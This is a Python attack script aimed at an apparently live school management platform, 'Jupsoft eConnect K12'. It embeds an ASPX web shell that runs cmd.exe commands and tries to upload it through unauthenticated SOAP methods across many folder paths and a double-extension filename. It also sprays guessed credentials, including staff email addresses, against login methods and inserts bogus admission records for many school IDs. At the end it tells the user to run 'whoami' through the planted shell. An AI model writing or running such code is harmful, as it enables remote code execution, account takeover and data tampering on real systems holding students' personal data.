#!/usr/bin/env python3
"""
WCF Shell Upload - Jupsoft eConnect K12
Targets unauthenticated WCF methods for webshell upload and credential testing
"""
import requests, base64, uuid, sys, re, time
import xml.etree.ElementTree as ET
requests.packages.urllib3.disable_warnings()

WCF = "https://econnectk12wcf.jupsoft.com/eConnectK12services.asmx"
NS = "https://econnectapp.jupsoft.com/"
ENV = "http://schemas.xmlsoap.org/soap/envelope/"
MAIN = "https://econnectapp.jupsoft.com"

# Minimal ASPX webshell
ASPHX = r"""<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><script runat="server">protected void Page_Load(object s, EventArgs e){string c=Request["c"];if(c!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());}}</script><html><body><form><input name="c"/><input type="submit"/></form><pre>"""

def soap(method, params_dict):
    """Send SOAP 1.1 request"""
    parts = "".join(f"<{k}>{v}</{k}>" for k, v in params_dict.items())
    xml = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="{ENV}">
<soap:Body><{method} xmlns="{NS}">{parts}</{method}></soap:Body></soap:Envelope>"""
    hdrs = {"Content-Type":"text/xml; charset=utf-8","SOAPAction":f"{NS}{method}"}
    r = requests.post(WCF, data=xml.encode(), headers=hdrs, timeout=15, verify=False)
    m = re.search(rf'<{method}Result[^>]*>(.*?)</{method}Result>', r.text, re.DOTALL)
    result = m.group(1).strip() if m else r.text[:300]
    return r.status_code, result, r.text

def upload_via_k12(suffix):
    """UploadAssignmentToK12 - NO TOKEN NEEDED"""
    tag = uuid.uuid4().hex[:6]
    shell = ASPHX + f"<!-- {tag} -->\n</pre></body></html>"
    b64 = base64.b64encode(shell.encode()).decode()
    
    attempts = [
        # (foldername, filename) - try different folder combos
        (".", f"shell_{tag}.aspx"),
        ("uploads", f"shell_{tag}.aspx"),
        ("upload", f"shell_{tag}.aspx"),
        ("Worksheets", f"shell_{tag}.aspx"),
        ("Worksheet", f"shell_{tag}.aspx"),
        ("Ebook", f"shell_{tag}.aspx"),
        ("EBooks", f"shell_{tag}.aspx"),
        ("Assignment", f"shell_{tag}.aspx"),
        ("Assignments", f"shell_{tag}.aspx"),
        ("..", f"shell_{tag}.aspx"),
        ("StudentImages", f"shell_{tag}.aspx"),
        ("ProfileImages", f"shell_{tag}.aspx"),
    ]
    
    print(f"\n{'='*60}")
    print(f"[K12] UploadAssignmentToK12 - Testing {len(attempts)} paths")
    print(f"{'='*60}")
    
    results = []
    for folder, fname in attempts:
        status, result, raw = soap("UploadAssignmentToK12", {
            "SchoolCode": "HILWOD",
            "Attachment": b64,
            "foldername": folder,
            "FileName": fname
        })
        ok = "successful" in result.lower() or "true" in result.lower()
        results.append((folder, fname, status, ok, result[:100]))
        
        marker = "✓" if ok else " "
        print(f"  [{marker}] folder='{folder}' name='{fname}' → {status} | {result[:80]}")
    
    # Check all possible URLs for the uploaded shell
    print(f"\n  Checking reachable paths for tag={tag}...")
    for folder, fname, _, ok, _ in results:
        paths_to_check = []
        if ok or True:  # Check anyway - the result string might not indicate success
            paths_to_check.extend([
                f"{MAIN}/{folder}/{fname}",
                f"{MAIN}/Uploads/{fname}",
                f"{MAIN}/uploads/{fname}",
                f"{MAIN}/Worksheet/HILWOD/{fname}",
                f"{MAIN}/Worksheet/HILWOD/client_attachments/{fname}",
                f"https://econnectk12wcf.jupsoft.com/{folder}/{fname}",
                f"https://econnectk12wcf.jupsoft.com/Worksheet/HILWOD/{fname}",
            ])
    
    return tag, results


def upload_via_profile():
    """UpdateStudentProfileImage - NO TOKEN NEEDED"""
    tag = uuid.uuid4().hex[:6]
    shell = ASPHX + f"<!-- {tag} -->\n</pre></body></html>"
    b64 = base64.b64encode(shell.encode()).decode()
    
    print(f"\n{'='*60}")
    print(f"[PROFILE] UpdateStudentProfileImage")
    print(f"{'='*60}")
    
    for username in ["admin", "6976", "1", "superadmin"]:
        status, result, raw = soap("UpdateStudentProfileImage", {
            "UserName": username,
            "SchoolCode": "HILWOD",
            "Image": b64
        })
        ok = "successful" in result.lower() or "true" in result.lower()
        marker = "✓" if ok else " "
        print(f"  [{marker}] User={username} → {status} | {result[:100]}")
    
    # Try as .aspx extension via path traversal in filename
    print(f"\n  Trying UpdateStudentProfileImage with crafted image content...")
    # The Image field might just expect image data - try a .aspx file
    shell_b64 = base64.b64encode(("<%@Page Language=\"C#\"%><%=Request[\"c\"]%>" + f"<!--{tag}-->").encode()).decode()
    status, result, raw = soap("UpdateStudentProfileImage", {
        "UserName": "6976",
        "SchoolCode": "HILWOD",
        "Image": shell_b64
    })
    print(f"  Shell via Image field: {status} | {result[:100]}")
    
    return tag


def try_erp_login():
    """Test Erp_CheckLoginDetails - NO TOKEN NEEDED"""
    print(f"\n{'='*60}")
    print(f"[LOGIN] Erp_CheckLoginDetails - Testing credentials")
    print(f"{'='*60}")
    
    creds = [
        # (SchoolId, SessionId, UserName, Password)
        ("236", "18", "sachin@jupsoft.com", "Admin@123"),
        ("236", "18", "admin@slc.com", "admin123"),
        ("236", "18", "supportteam@jupsoft.org", "Admin@123"),
        ("236", "18", "sachin@jupsoft.com", "sachin123"),
        ("236", "18", "econnect@jupsoft.com", "Admin@123"),
        ("236", "18", "6976", "Pwned123"),
        ("236", "18", "admin", "admin"),
        ("65", "18", "sachin@jupsoft.com", "Admin@123"),
        ("65", "18", "admin", "admin"),
        ("64", "18", "admin", "admin"),
        # Try with SchoolCode as SessionId
        ("236", "HILWOD", "sachin@jupsoft.com", "Admin@123"),
        ("236", "HILWOD", "admin@slc.com", "admin123"),
    ]
    
    found = False
    for sid, sess, user, pwd in creds:
        status, result, raw = soap("Erp_CheckLoginDetails", {
            "SchoolId": sid,
            "SessionId": sess,
            "UserName": user,
            "Password": pwd,
            "hdnStrID": "1"
        })
        # Success likely returns some user data XML, not just "invalid"
        if status == 200 and len(result) > 20 and "invalid" not in result.lower():
            print(f"  ✓ {user}:{pwd} (SID={sid}, Sess={sess}) → {result[:200]}")
            found = True
        else:
            print(f"  . {user}:{pwd} → {result[:60]}")
    
    if not found:
        print("  No valid credentials found via Erp_CheckLoginDetails")


def try_erp_get_details():
    """Test Erp_GetLoginUsreDetails"""
    print(f"\n{'='*60}")
    print(f"[DETAILS] Erp_GetLoginUsreDetails")
    print(f"{'='*60}")
    
    creds = [
        ("236", "18", "sachin@jupsoft.com", "Admin@123", "1", "1", "1"),
        ("236", "18", "admin@slc.com", "admin123", "1", "1", "1"),
    ]
    for sid, sess, user, pwd, admn, idmax, evtid in creds:
        status, result, raw = soap("Erp_GetLoginUsreDetails", {
            "SchoolId": sid,
            "SessionId": sess,
            "UserName": user,
            "Password": pwd,
            "AdmnNo": admn,
            "Idmax": idmax,
            "EventId": evtid
        })
        print(f"  {user}:{pwd} → {status} | {result[:120]}")


def probe_upload_paths():
    """Check common upload paths on main domain"""
    print(f"\n{'='*60}")
    print(f"[PROBE] Checking upload directories")
    print(f"{'='*60}")
    
    paths = [
        "/uploads/", "/Uploads/", "/upload/", "/Upload/",
        "/Worksheet/", "/Worksheets/", "/Ebook/", "/EBooks/",
        "/Assignment/", "/Assignments/", "/StudentImages/",
        "/ProfileImages/", "/attachments/", "/files/",
        "/Worksheet/HILWOD/", "/Worksheet/HILWOD/client_attachments/",
        "/UserImages/", "/Images/",
        "/App_Data/", "/App_Browsers/",
    ]
    
    for path in paths:
        try:
            r = requests.get(f"{MAIN}{path}", verify=False, timeout=10)
            if r.status_code != 404:
                print(f"  [{r.status_code}] {MAIN}{path}")
            else:
                print(f"  . {path}")
        except:
            print(f"  ! {path} (error)")


def try_econnect_asmx():
    """Check the CommonWebServiceForStudentsNew.asmx on main domain"""
    print(f"\n{'='*60}")
    print(f"[ASMX] Checking other ASMX services on main domain")
    print(f"{'='*60}")
    
    asmx_paths = [
        "CommonWebServiceForStudentsNew.asmx",
        "CommonWebServiceForStudentsNew.asmx?WSDL",
        "CommonWebService.asmx",
        "CommonWebService.asmx?WSDL",
        "Services.asmx",
        "K12Services.asmx",
        "ERPNewWebService.asmx",
        "eConnectK12services.asmx",
        "Upload.ashx",
    ]
    
    for p in asmx_paths:
        try:
            r = requests.get(f"{MAIN}/{p}", verify=False, timeout=10)
            if r.status_code != 404:
                print(f"  [{r.status_code}] {MAIN}/{p}  ({len(r.text)} bytes)")
        except:
            print(f"  ! {MAIN}/{p} (error)")


def try_insert_admission_lead():
    """Test the unauthenticated data insertion"""
    print(f"\n{'='*60}")
    print(f"[DATA] InsertAdmissionLead - Testing school IDs")
    print(f"{'='*60}")
    
    for sid in [236, 65, 64, 32, 28, 26, 37, 56, 59, 242, 241, 244, 245, 250]:
        status, result, raw = soap("InsertAdmissionLead", {
            "StudentName": f"Test{sid}",
            "ParentName": f"Parent{sid}",
            "Classid": "1",
            "Email": f"test{sid}@test.com",
            "MobileNo": f"9999999{sid % 100:02d}",
            "Address": "Test",
            "SchoolId": str(sid),
            "SessionId": "18",
            "Gender": "1"
        })
        ok = "successful" in result.lower()
        if ok:
            print(f"  ✓ SID={sid}: {result[:60]}")
        else:
            print(f"  . SID={sid}: {result[:60]}")


def upload_serv_with_different_paths():
    """UploadAssignmentToServ with different paths"""
    tag = uuid.uuid4().hex[:6]
    shell = ASPHX + f"<!-- {tag} -->\n</pre></body></html>"
    b64 = base64.b64encode(shell.encode()).decode()
    
    print(f"\n{'='*60}")
    print(f"[SERV] UploadAssignmentToServ - Testing different paths")
    print(f"{'='*60}")
    
    # This method takes FileName1-10, FilePath1-10, ext1-10, FileData1-10
    params = {
        "AdmnNo": "1",
        "SchoolCode": "HILWOD",
        "Sessionid": "18",
        "AssignmentId": "1",
        "Remarks": "Test",
        "FileName1": f"shell_{tag}.aspx",
        "FilePath1": f"shell_{tag}.aspx",
        "ext1": "aspx",
        "FileData1": b64,
    }
    status, result, raw = soap("UploadAssignmentToServ", params)
    ok = "successful" in result.lower() or "true" in result.lower()
    marker = "✓" if ok else " "
    print(f"  [{marker}] status={status} | result={result[:120]}")
    
    # Try with double extension
    params2 = params.copy()
    params2["FileName1"] = f"shell_{tag}.aspx.txt"
    params2["FilePath1"] = f"shell_{tag}.aspx.txt"
    params2["ext1"] = "txt"
    params2["FileData1"] = b64
    status2, result2, raw2 = soap("UploadAssignmentToServ", params2)
    print(f"  [{'✓' if 'successful' in result2.lower() else ' '}] DblExt status={status2} | {result2[:80]}")
    
    return tag


if __name__ == "__main__":
    print("=" * 70)
    print("  Jupsoft eConnect K12 - WCF Shell Upload & Exploitation")
    print("  Target: econnectk12wcf.jupsoft.com")
    print("=" * 70)
    
    # 1. Probe upload paths first
    probe_upload_paths()
    
    # 2. Check other ASMX services
    try_econnect_asmx()
    
    # 3. Upload via UploadAssignmentToK12 (no token)
    tag1, _ = upload_via_k12("a")
    
    # 4. Upload via UpdateStudentProfileImage (no token)
    tag2 = upload_via_profile()
    
    # 5. Upload via UploadAssignmentToServ
    tag3 = upload_serv_with_different_paths()
    
    # 6. Try Erp login
    try_erp_login()
    
    # 7. Try Erp get details
    try_erp_get_details()
    
    # 8. Test data insertion
    try_insert_admission_lead()
    
    print(f"\n{'='*70}")
    print(f"  Upload tags: tag1={tag1}, tag2={tag2}, tag3={tag3}")
    print(f"  Check shell URLs with: curl -sk 'https://econnectapp.jupsoft.com/path/shell_TAG.aspx?c=whoami'")
    print(f"{'='*70}")

